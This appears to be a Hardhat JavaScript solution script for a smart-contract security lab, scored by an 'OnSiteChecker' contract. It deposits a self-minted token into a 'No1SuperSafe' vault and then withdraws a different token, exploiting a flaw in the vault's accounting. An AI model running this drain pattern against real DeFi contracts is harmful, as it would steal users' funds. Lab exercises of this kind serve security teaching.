// This setup uses Hardhat Ignition to manage smart contract deployments.
// Learn more about it at https://hardhat.org/ignition

const hre = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();

  const OnSiteChecker = await hre.ethers.getContractAt("OnSiteChecker", "0x53040a293297fA879329f418E6A28E816832A867");
  const No1SuperSafe = await hre.ethers.getContractAt("No1SuperSafe", "0x7b10eFb166EFBD0edDB8800f73fc631148eA1722");
  const qytoken = await hre.ethers.getContractAt("QyToken", "0x36bF9A1b9959812646caac7E308AcA64920305e4");

  console.log("transfering")
  // lab1 get give token to myself
  const transferring = await qytoken.getTokens(deployer, "2000000000000000000000");
  console.log("transferred", transferring.hash);

  const approval = await qytoken.connect(deployer).approve(No1SuperSafe, "1000000000000000000000");
  console.log("approval", approval.hash);

  //depositing own token to safe (initiating attack)
  const depositing = await No1SuperSafe.connect(deployer).despoit("0x36bF9A1b9959812646caac7E308AcA64920305e4", "1000000000000000000000");
  console.log("depositing to safe", depositing.hash);

  //get the targetted token
  const withdrawing = await No1SuperSafe.connect(deployer).withdraw("0x0CB70e82cDA48ac413d15dDb5782130F57ef8844", "1000000000000000000000");
  console.log("transferred", withdrawing.hash);

  //check score, check if above attack is successful or not
  const checkScore = await OnSiteChecker.connect(deployer).updateScores();
  console.log("checking score hash", checkScore.hash);

  const scoring = await OnSiteChecker.scores[deployer];
  console.log("new score", scoring);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });